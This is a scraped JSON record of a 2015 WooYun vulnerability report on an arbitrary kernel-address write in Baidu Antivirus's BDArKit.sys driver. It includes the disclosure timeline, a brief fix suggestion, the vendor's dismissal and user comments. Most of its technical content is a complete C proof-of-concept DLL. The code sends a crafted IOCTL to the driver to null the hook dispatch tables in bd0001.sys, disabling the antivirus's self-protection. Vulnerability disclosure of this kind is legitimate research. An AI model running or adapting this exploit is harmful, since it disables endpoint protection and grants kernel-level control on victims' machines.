{"id": 24367, "wybug_id": "wooyun-2015-0103438", "wybug_title": "百度杀毒任意内核地址写入漏洞解除全防御", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2015-03-24 15:34", "wybug_open_date": "2015-06-27 15:37", "wybug_type": "权限提升", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["驱动权限提升"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-29：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向公众公开  简要描述：  详细说明：  BDArKit.sys对DeviceIoControl处理的参数检查不严格，可以造成任意地址写入漏洞1.版本\n\nBDArKit.sys  2.0.13.34bd0001.sys   2.0.1.11系统：windows xp sp32.说明利用该漏洞，可以对任意内核地址写入0x00000000。比如将bd0001.sys内部记录的SSDT hook分发函数表置为空，从而解除全防御。也可以对其余内核模块进行修改实现用户态对内核态的完全控制。\n\n漏洞触发之前：\n\n\n\n漏洞触发之后：\n\n\n\n   漏洞证明：  \nDWORD GetDriverBase(CHAR* pName){\ttypedef struct _SYSTEM_MODULE_INFORMATION {\t\tULONG Reserved [2]; \t\tPVOID Base; \t\tULONG Size; \t\tULONG Flags; \t\tUSHORT Index; \t\tUSHORT Unknown; \t\tUSHORT LoadCount; \t\tUSHORT ModuleNameOffset; \t\tCHAR ImageName [256 ]; \t} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; \ttypedef LONG (WINAPI* FN_ZwQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);\tFN_ZwQuerySystemInformation fn = \t\t(FN_ZwQuerySystemInformation)GetProcAddress(GetModuleHandle(_T(\"ntdll\")), \"ZwQuerySystemInformation\");\tif(!fn)\t\treturn 0;\tDWORD dwBase = 0;\tCHAR* pBuffer = new CHAR[0x10000];\tmemset(pBuffer, 0, 0x10000);\tULONG cb = 0;\tLONG l = (*fn)(11, pBuffer, 0x10000, &cb);\tif(0 == l)\t{\t\tULONG count = *((ULONG*)pBuffer);\t\tPSYSTEM_MODULE_INFORMATION pInfo = (PSYSTEM_MODULE_INFORMATION)(pBuffer + sizeof(ULONG));\t\tfor (ULONG i = 0; i < count; ++i)\t\t{\t\t\tif('\\0' != pInfo[i].ImageName[0])\t\t\t{\t\t\t\tstrlwr(pInfo[i].ImageName);\t\t\t\t\t\t\tif(pName && strstr(pInfo[i].ImageName, pName))\t\t\t\t{\t\t\t\t\tdwBase = (DWORD)pInfo[i].Base;\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t}\t}\tdelete pBuffer;\treturn dwBase;}void CallDriver(HANDLE hDev){\tDWORD bd0001Base = GetDriverBase(\"bd0001.sys\");\tif(!bd0001Base)\t\treturn;\tDWORD code = 0x222028;\tchar inputBuff[0x1000] = { 0 };\tDWORD inputLen = 0xfc4;\tDWORD dwReturned = 0;\tDWORD a[] = {0x0000000a,0xfc4};\tfor(DWORD i = 0; i < sizeof(a)/sizeof(*a); ++i)\t{\t\t*((DWORD*)(inputBuff + 4*i)) = a[i];\t}\tDeviceIoControl(hDev,\t\tcode, \t\t(LPVOID)inputBuff,\t\tinputLen, \t\t(LPVOID)(bd0001Base + 0x14e80), // NtTerminateProcess的Hook函数分发表\t\t0, \t\t&dwReturned,\t\tNULL);\tDeviceIoControl(hDev,\t\tcode, \t\t(LPVOID)inputBuff,\t\tinputLen, \t\t(LPVOID)(bd0001Base + 0x132a8), // NtOpenProcess的Hook函数分发表\t\t0, \t\t&dwReturned,\t\tNULL);}void FuzzDriver(){\tLPCTSTR DevName = _T(\"\\\\\\\\.\\\\BDArKit\");\tHANDLE hDev = CreateFile(DevName,\t\tGENERIC_READ,\t\tFILE_SHARE_READ|FILE_SHARE_WRITE,\t\tNULL,\t\tOPEN_EXISTING,\t\tFILE_ATTRIBUTE_NORMAL,\t\tNULL);\tif(INVALID_HANDLE_VALUE != hDev)\t{\t\tCallDriver(hDev);\t\tCloseHandle(hDev);\t}}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved\t\t\t\t\t ){    FuzzDriver();    return TRUE;}\n\n\n   修复方案：  加强IRP_MJ_DEVICE_CONTROL处理函数的逻辑检查，对参数做有效性校验。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-27 15:37 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-24 16:09 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:51        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  666666    \n     2015-03-27 23:16 |    \t\talvin \t\t\t( 普通白帽子  |\t\t\t        Rank:175 漏洞数:21        | 我的QQ：1114112873)\t\t \n  还不确认？想让我放自保护绕过和任意dll内核注入漏洞吗？    \n     2015-06-28 11:59 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  666百度还真有自知者明啊知道他的流氓杀毒软件没人用所以回应一个无影响2333~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}